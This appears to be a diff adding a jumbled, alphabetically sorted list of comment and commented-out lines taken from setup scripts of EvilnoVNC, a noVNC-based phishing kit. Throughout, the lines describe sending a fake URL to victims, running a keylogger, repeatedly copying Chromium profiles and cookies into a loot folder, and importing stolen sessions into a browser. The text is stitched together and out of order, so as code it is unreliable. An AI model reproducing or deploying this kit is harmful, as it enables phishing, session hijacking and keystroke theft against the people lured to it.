@@ -1,0 +1,129 @@
+	#-v /root/haproxy/cors.lua:/etc/cors.lua \"
+	#cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
+	#rm -Rf ~/.config/chromium/Default > /dev/null 2>&1
+
+"	#/bin/bash -c ""/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &"" > /dev/null 2>&1 &"
+"	#printf ""\n\e[1;33m[>] Import stealed session to Chromium..\n"""
+"
+"# adjust error messages, e.g. haproxy/503.http"
+"# combined cert+key in single pem, ./ means in haproxy/"
+"# define custom port for victims, e.g. for testing, sUrl will be adjusted accordingly"
+"# e.g. start.sh dynamic ""https://example.com"" 02"
+"# running as user ""user"" not root!"
+"# there needs to be another server container running, else haproxy would fail starting up..."
+"#/bin/bash -c ""/home/user/kiosk.sh"" &"
+"#IFS=x read -ra arr <<< ""$RESOLUTION"" && sudo sed -i ""s/--window-size=[0-9]*,[0-9]*/--window-size=${arr[0]},${arr[1]}/"" /etc/chromium/chromium.conf"
+"#IFS=x read -ra arr <<< ""$RESOLUTION"" && sudo sed -i ""s/1280,720/${arr[0]},${arr[1]}/"" /etc/chromium/chromium.conf"
+"#URL=$(head -1 php.ini | cut -d ""="" -f 2)"
+"#\e[1;32m  ---------------- by @JoelGMSec --------------\n\e[1;0m"" "
+"#cert=""/etc/letsencrypt/live/yourDomain/certandkey.pem"""
+"#echo ""URL=$WEBPAGE"" > php.ini ; URL=$(head -1 php.ini | cut -d ""="" -f 2)"
+"#echo $TITLE > title.txt && sed -i ""4s/.*/$(head -1 title.txt)/g"" noVNC/index.html"
+"#nohup /bin/bash -c ""sleep 30 && sudo python3 /home/user/keylogger.py 2> log.txt"" &"
+"#nohup /bin/bash -c ""sleep 7 && sudo python3 keylogger.py 2>> errorlog.txt"" &"
+"#nohup /bin/bash -c ""touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default"" &"
+"#nohup /bin/bash -c ""touch /home/user/Downloads/Keylogger.txt ; sudo pip3 install pyxhook pycryptodome"" &"
+"#nohup /bin/bash -c ""while true ; do sleep 30 ; sudo cp -R -u /root/.config/chromium/Default /home/user/Downloads/ ; done"" &"
+"#nohup /bin/bash -c ""while true ; do sleep 32 ; sudo cp -R -u /root/Downloads/ /home/user/Downloads/ ; done"" &"
+"#sleep 2 && /usr/bin/chromium-browser ""$URL"" &"
+"#sudo -E /bin/bash -c ""php -q -S 0.0.0.0:8111 &"" > /dev/null 2>&1"
+"#sudo -E /bin/bash -c ""php -q -S 0.0.0.0:8111 &"""
+#     https://darkbyte.net    #
+#   EvilnoVNC by @JoelGMSec   #
+# 1. run controller in screen session"
+# 2. run haproxy in screen session"
+# 3. run EvilnoVNC instances in screen session"
+# Banner"
+# Help & Usage"
+# Main function"
+# Remove all dangling images"
+# Remove all unused containers, networks, images (both dangling and unused), and optionally, volumes."
+# Restore permissions of docker socket"
+# TODO config not found... necessary?
+# Variables"
+# add backend entries
+# add backend novnc entries"
+# add backend rules per instance"
+# arguments given?"
+# build & run EvilnoVNC instances"
+# build & run controller"
+# build & run haproxy/backend"
+# build and run EvilKnievelnoVNC after setup via setup.sh
+# build"
+# certandkey.pem built from cert.pem and privatekey.pem"
+# check screen dependency"
+# cleanup generated and collected data via ./setup.sh clean
+# create docker internal network"
+# define TCP port for administrative access"
+# define URL of your server (fake URL sent to victims)"
+# define admin interface credentials, change the password!"
+# define number of concurrent EvilnoVNC instances"
+# define path to TLS cert+key"
+# define target URL where victims effectively log in to"
+# do some dbus stuff"
+# for controller to control EvilnoVNC containers"
+# get title of target site and set it to our victim page"
+# if timezone is different than Europe/Berlin, grep/sed through the files and adjust to your needs ;)"
+# no ending slash! e.g. https://example.com
+# prepare download dir"
+# prepare loot und keylogger"
+# prepare site"
+# read URL from file (env)"
+# regularly store collected data"
+# remove --rm if no modifications to image"
+# remove X display lock"
+# run"
+# server.sh
+# set target URL in php.ini for getting the title"
+# setup script for EvilKnievelnoVNC
+# start PHP for static page reading resolution"
+# start X server with chromium (quicker start in kiosk.sh)"
+# start X with given resolution"
+# start chromium with target URL, sleep: wait for resolution to be read and stored to disk"
+# start kiosk.sh in background"
+# start x11vnc and novnc_proxy"
+# start.sh dynamic ""url"" instance-id"
+# stop PHP and redirect traffic to noVNC port"
+# stops all running docker containers!
+# usage: ./setup clean"
+# username is ekadmin
+# wait for victim resolution to be written to disk"
+# wait until X display is created"
+# write resolution to chromium.conf and add custom profile dir"
+#!/bin/bash
+## BUILD & RUN
+## CLEANUP
+## CONFIGURATION
+## SETUP
+## add instance entries to haproxy.cfg"
+## build EvilnoVNC run.sh from template"
+## build haproxy config from template"
+## build haproxy run script"
+## build phishboard/index.php"
+## build pishboard/interact.php"
+## build run.sh from template"
+## check for dependencies"
+## create dynamic files"
+## optional/internal settings"
+## prepare Loot dir"
+## set permissions"
+### FORMER startVNC.sh ###"
+###############################################################
+###############################################################"
+#/usr/bin/chromium-browser --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start &
+#=============================#
+#TODO kiosk.zip?
+#export DISPLAY=:0
+#for i in {$instances..1..1}
+#jobs"
+#ln -s /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
+#mkdir -p /home/user/Downloads
+#nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &
+#nohup startx &
+#nohup startx chromium &
+#sleep 2
+#sudo -E /bin/bash -c /home/user/startVNC.sh $RESOLUTION
+#sudo docker run -d --rm -p 127.0.0.1:21212:80 -v ""/tmp:/tmp"" -v ""${PWD}/Downloads"":""/home/user/Downloads"" -e ""WEBPAGE=$WEBPAGE"" -e ""SNAME=$SNAME"" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1"
+#sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
+#sudo mkdir -p Downloads && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
+#sudo mkdir Downloads 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
